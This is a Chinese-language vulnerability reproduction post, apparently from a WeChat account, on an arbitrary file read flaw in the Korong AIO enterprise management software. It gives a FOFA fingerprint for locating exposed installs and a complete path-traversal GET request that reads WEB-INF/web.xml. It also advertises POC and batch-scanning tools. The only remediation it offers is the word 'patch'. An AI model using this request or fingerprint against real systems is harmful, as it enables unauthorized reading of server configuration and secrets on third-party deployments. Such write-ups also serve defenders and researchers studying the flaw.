#  科荣AIO ReadFile存在任意文件读取漏洞   
南风徐来  南风漏洞复现文库   2024-04-10 21:07  
  
免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
## 1. 科荣AIO ReadFile简介  
  
微信公众号搜索：南风漏洞复现文库 该文章 南风漏洞复现文库 公众号首发  
  
科荣AIO---集成进销存,财务,OA,CRM,HR,电子商务一体化企业管理软件。  
## 2.漏洞描述  
  
科荣AIO---集成进销存,财务,OA,CRM,HR,电子商务一体化企业管理软件。该系统存在任意文件读取漏洞。  
  
CVE编号:  
  
CNNVD编号:  
  
CNVD编号:  
## 3.影响版本  
  
科荣AIO  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3blOUicZbUwVCbSoicaibJF8DicO7p6VZnTH4ejVE5v9fjyIuOFh5vwYjl3BGyOTfEhh9Hw9XN11j1kzg/640?wx_fmt=jpeg&from=appmsg "null")  
  
科荣AIO ReadFile存在任意文件读取漏洞  
## 4.fofa查询语句  
  
body="changeAccount('8000')"  
## 5.漏洞复现  
  
漏洞链接：http://127.0.0.1/ReadFile?tempFile=path&path=../../website/WEB-INF/&fileName=web.xml  
  
漏洞数据包：  
```
GET /ReadFile?tempFile=path&path=../../website/WEB-INF/&fileName=web.xml HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Accept: */*
Connection: Keep-Alive
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3blOUicZbUwVCbSoicaibJF8Dic66IUcc2uYxzPUnvYTje7iakg3URsXdGdwZ7QYW064HJuJ3Gvj0XyWicg/640?wx_fmt=jpeg&from=appmsg "null")  
## 6.POC&EXP  
  
关注公众号 南风漏洞复现文库 并回复 漏洞复现123 即可获得该POC工具下载地址：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3blOUicZbUwVCbSoicaibJF8Dic32yYIBLgcJsnoxt6BpHt4UMMdqQdCICFLFNCysVMibibcobIrmGBNJqA/640?wx_fmt=jpeg&from=appmsg "null")  
  
本期漏洞及往期漏洞的批量扫描POC及POC工具箱已经上传知识星球：南风网络安全1: 更新poc批量扫描软件，承诺，一周更新8-14个插件吧，我会优先写使用量比较大程序漏洞。2: 免登录，免费fofa查询。3: 更新其他实用网络安全工具项目。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3blOUicZbUwVCbSoicaibJF8DicpaicBa1p2WMZMJMUjTW9zbowr2bt6ibicabtYUnswqPDGQFObU5iapdELg/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3blOUicZbUwVCbSoicaibJF8DicctMVv3toGRq0oxEFbGo3ic3Utiay4xQWCqXI3mItUCOjiaJhkpe4xJhpA/640?wx_fmt=jpeg&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3blOUicZbUwVCbSoicaibJF8Dic5HQCfv3f0zBvvMCCoibYdiacloI9LDX2yrMDJXM15F6T7VU5Fwmt5rHg/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3blOUicZbUwVCbSoicaibJF8Dic9iaib9tZEyMRVup6rKtNeBgKNU5g7j2CaiaOjcG2AibB0j0Nx2KibqNGx8w/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3blOUicZbUwVCbSoicaibJF8Dic5eC882Ce42UaIRY0oNEvNxvB540S6WFnkq2k3ojfJ2EDV7v6Iz8MXA/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3blOUicZbUwVCbSoicaibJF8DicktzqUUIj1iczLjdhSgwC8LdPW6vgF9KZupgcZGwu692G88Nxr3QIic4w/640?wx_fmt=jpeg&from=appmsg "null")  
## 7.整改意见  
  
打补丁  
## 8.往期回顾  
  
[浙大恩特客户资源管理系统RegulatePriceAction.entsoft;.js接口存在SQL注入漏洞](http://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247486123&idx=1&sn=20bcfc57f151f3d39984f1a579e7e172&chksm=974b87aca03c0ebae04a1b736e04f05a1d0f3a739a41774f2b2223cab29b7b5ae7c3e7c03774&scene=21#wechat_redirect)  
  
  
[D-Link NAS设备nas_sharing.cgi接口存在远程命令执行漏洞CVE-2024-3273](http://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247486098&idx=1&sn=a73ca152dbb0b24fc06474932072b496&chksm=974b8795a03c0e834fefe9d2713ff01cb9ff47264c800fa316f99d052a06580e131f9fe50a8d&scene=21#wechat_redirect)  
  
  
  
  
